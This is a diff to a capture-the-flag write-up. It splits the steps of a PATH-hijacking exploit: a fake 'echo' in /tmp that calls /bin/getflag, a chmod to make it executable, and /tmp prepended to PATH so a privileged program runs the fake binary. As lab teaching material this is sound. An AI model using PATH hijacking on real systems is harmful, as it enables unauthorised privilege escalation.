@@ -29,12 +29,15 @@ $ vim /tmp/echo
 /bin/getflag
 ```
 
-We created our fake echo.
-</br>
-Now we add /tmp to the list of possible directories to search for echo at the beginning so that it finds our echo first.
+We created our fake echo. We add permissions to our echo.
 
 ```
 $ chmod +x /tmp/echo
+```
+
+Now we add /tmp to the list of possible directories to search for echo at the beginning so that it finds our echo first.
+
+```
 $ export PATH=/tmp:$PATH
 ```
 
